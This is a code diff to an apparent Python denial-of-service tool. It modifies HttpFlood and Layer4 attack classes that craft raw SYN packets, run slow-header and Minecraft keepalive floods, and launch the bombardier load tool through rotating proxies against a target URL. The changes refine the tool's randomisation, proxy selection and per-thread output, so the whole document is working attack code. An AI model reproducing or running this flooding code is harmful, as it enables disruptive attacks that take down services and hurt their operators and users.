@@ -9,14 +9,13 @@ from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
-from random import choice as randchoice
-from random import randint
+from secrets import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from struct import pack as data_pack
-from subprocess import run
+from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
 from threading import Event, Thread
@@ -156,7 +155,7 @@ class Tools:
 
     @staticmethod
     def randchr(lengh: int) -> str:
-        return "".join([chr(randint(0, 1000)) for _ in range(lengh)]).strip()
+        return str(ProxyTools.Tools.rand_char(lengh)).strip()
 
     @staticmethod
     def send(sock: socket, packet: bytes):
@@ -412,7 +411,7 @@ class Layer4(Thread):
             sleep(1.5)
 
             c = 360
-            while Tools.send(s, Minecraft.keepalive(randint(1111111, 9999999))):
+            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999))):
                 c -= 1
                 if c:
                     continue
@@ -463,7 +462,7 @@ class Layer4(Thread):
         tcp: TCP = TCP()
         tcp.set_SYN()
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(randint(1, 65535))
+        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
@@ -500,6 +499,7 @@ class HttpFlood(Thread):
     SENT_FLOOD: Any
 
     def __init__(self,
+                 thread_id: int,
                  target: URL,
                  host: str,
                  method: str = "GET",
@@ -510,6 +510,7 @@ class HttpFlood(Thread):
                  proxies: Set[Proxy] = None) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
+        self._thread_id = thread_id
         self._synevent = synevent
         self._rpc = rpc
         self._method = method
@@ -645,7 +646,7 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (randint(1000, 99999), ProxyTools.Random.rand_str(6),
+            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -885,19 +886,31 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def BOMB(self):
-        pro = randchoice(self._proxies)
+        assert self._proxies, \
+            'This method requires proxies. ' \
+            'Without proxies you can use github.com/codesenberg/bombardier'
 
-        run([
-            f'{bombardier_path}',
-            f'--connections={self._rpc}',
-            '--http2',
-            '--method=GET',
-            '--no-print',
-            '--timeout=5s',
-            f'--requests={self._rpc}',
-            f'--proxy={pro}',
-            f'{self._target.human_repr()}',
-        ])
+        while True:
+            proxy = randchoice(self._proxies)
+            if proxy.type != ProxyType.SOCKS4:
+                break
+
+        res = run(
+            [
+                f'{bombardier_path}',
+                f'--connections={self._rpc}',
+                '--http2',
+                '--method=GET',
+                '--latencies',
+                '--timeout=30s',
+                f'--requests={self._rpc}',
+                f'--proxy={proxy}',
+                f'{self._target.human_repr()}',
+            ],
+            stdout=PIPE,
+        )
+        if self._thread_id == 0:
+            print(proxy, res.stdout.decode(), sep='\n')
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
@@ -907,7 +920,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
                 for i in range(self._rpc):
-                    keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
+                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
@@ -1372,9 +1385,9 @@ if __name__ == '__main__':
                             "RPC (Request Pre Connection) is higher than 100")
 
                     proxies = handleProxyList(con, proxy_li, proxy_ty, url)
-                    for _ in range(threads):
-                        HttpFlood(url, host, method, rpc, event, uagents,
-                                  referers, proxies).start()
+                    for thread_id in range(threads):
+                        HttpFlood(thread_id, url, host, method, rpc, event,
+                                  uagents, referers, proxies).start()
 
                 if method in Methods.LAYER4_METHODS:
                     target = URL(urlraw)
